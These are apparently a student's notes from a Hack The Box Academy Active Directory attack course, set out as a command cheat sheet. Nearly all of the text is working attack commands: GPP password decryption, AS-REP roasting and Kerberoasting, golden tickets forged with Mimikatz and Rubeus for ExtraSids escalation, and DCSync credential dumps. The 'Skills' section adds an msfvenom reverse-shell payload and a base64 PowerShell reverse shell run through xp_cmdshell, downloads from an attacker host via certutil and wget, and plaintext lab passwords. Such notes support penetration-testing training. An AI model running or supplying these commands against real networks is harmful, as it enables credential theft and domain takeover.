PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

## Group Policy Preferences (GPP) Passwords

gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

crackmapexec smb -L | grep gpp

crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

## ASREPRoasting
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users

## Group Policy Object (GPO) Abuse
PS C:\htb> Get-DomainGPO |select displayname

PS C:\htb> Get-GPO -All | Select DisplayName

PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

- Confirm result in BH
```

## Why So Trusting

#### Domain Trusts Primer
```powershell-session
## Enumerating Trust Relationships
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *

PS C:\htb> Get-DomainTrust 

PS C:\htb> Get-DomainTrustMapping

PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

C:\htb> netdom query /domain:inlanefreight.local trust

C:\htb> netdom query /domain:inlanefreight.local dc

C:\htb> netdom query /domain:inlanefreight.local workstation

- Visualizing Trust Relationships in BH (analysis -> map domain trust)
```

#### Attacking Domain Trusts - Child -> Parent Trusts - from Windows
```powershell-session
## ExtraSids Attack - Mimikatz
PS C:\htb> .\mimikatz.exe "lsadump::dcsync /user:LOGISTICS\krbtgt" "exit"

PS C:\htb> Get-DomainSID

PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

PS C:\htb> .\mimikatz.exe "kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt" exit

PS C:\htb> klist

PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

## ExtraSids Attack - Rubeus
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

PS C:\htb> klist

PS C:\Tools\mimikatz\x64> .\mimikatz.exe "lsadump::dcsync /user:INLANEFREIGHT\lab_adm" "exit"

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```
#### Attacking Domain Trusts - Child -> Parent Trusts - from Linux
```shell-session
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 

lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

export KRB5CCNAME=hacker.ccache 

psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

## Breaking Down Boundaries
#### Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
```powershell-session
## Cross-Forest Kerberoasting
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

## Admin Password Re-Use & Group Membership
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all
```

#### Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
```shell-session
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  

## Hunting Foreign Group Membership with Bloodhound-python
cat /etc/resolv.conf 

bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

Note: Suppose we can Kerberoast across a trust and have run out of options in the current domain. In that case, it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned.

zip -r ilfreight_bh.zip *.json

cat /etc/resolv.conf 

bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2

- Viewing Dangerous Rights through BloodHound (users with Foreign Group Membership)
```

#### Skills (looking at new cmd's and tricks not mentioned explicitly in course)
```
Skills1:

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:svc_sql /p:'lucky7' /v:172.16.6.50 /tls-seclevel:0 /timeout:80000

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:tpetty /p:'Sup3rS3cur3D0m@inU2eR' /v:172.16.6.50 /tls-seclevel:0 /timeout:80000

msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.10.16.28 -f exe -o backupscript.exe LPORT=12345

certutil -urlcache -split -f "http://10.10.16.28:8000/backupscript.exe" 

crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa

pypykatz lsa minidump lsass.dmp 

Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"


msfconsole -q

	On attack host:
	msf6 > use exploit/multi/handler
	
	[*] Using configured payload generic/shell_reverse_tcp
	msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
	payload => windows/x64/meterpreter/reverse_https
	msf6 exploit(multi/handler) > set lhost 0.0.0.0
	lhost => 0.0.0.0
	msf6 exploit(multi/handler) > set lport 12345
	lport => 8000
	msf6 exploit(multi/handler) > run 

.\backupscript.exe




Skills 2:
xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALg... base64_reverse_shell' <->
- adapted from https://www.revshells.com/, powershell base64 transfer


rdp things:
xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:svc_sql /p:'lucky7' /v:172.16.6.50 /tls-seclevel:0 /timeout:80000

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:AB920 /p:'weasal' /v:172.16.6.50 /tls-seclevel:0 /timeout:80000

ssh htb-student@10.129.157.60
HTB_@cademy_stdnt!
host:
python -m http.server

sudo ip tuntap add user eric mode tun ligolo
sudo ip link set ligolo up
ifconfig

sudo ip route add 172.16.6.0/23 dev ligolo

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:AB920 /p:'weasal' /v:172.16.7.50 /tls-seclevel:0 /timeout:80000

cd /opt


pivot:
wget http://10.10.16.28:8000/agent
chmod +x agent
./agent -connect 10.10.16.28:11601 -ignore-cert

Get-NetLocalGroupMember -ComputerName MS01 -GroupName "Remote Desktop Users"

certutil -urlcache -split -f "http://10.10.16.28:8000/agent.exe" 


PowerShell
certutil -urlcache -split -f "http://10.10.16.28:8000/PowerView.ps1" 
Import-Module .\PowerView.ps1

Get-NetLocalGroupMember -ComputerName MS01 -GroupName "Remote Desktop Users"


Get-DomainUser -Identity svc_sql -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol


Get-NetLocalGroupMember -ComputerName MS01 -GroupName "Remote Desktop Users"
-> only local admin can log on



sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 

find / type -f name "bloodhound-python" 2>/dev/null

test proficcency of personal blood hound

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:htb-student /p:'Academy_student_AD!' /v:10.129.55.245 /tls-seclevel:0 /timeout:80000

sudo ip route delete ligolo

sudo ip route add 172.16.4.0/23 dev ligolo

windows:
certutil -urlcache -split -f "http://10.10.16.28:8000/agent.exe" 

./agent -connect 10.10.16.28:11601 -ignore-cert

sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 


certutil -urlcache -split -f "http://10.10.16.28:8000/SharpHound.exe" 

rdp, sql, winrm, smb
active directory: handle brute force attacks carefully based on password policy on domain accounts. 


sometimes exploitation, sometimes lateral movement. 

```






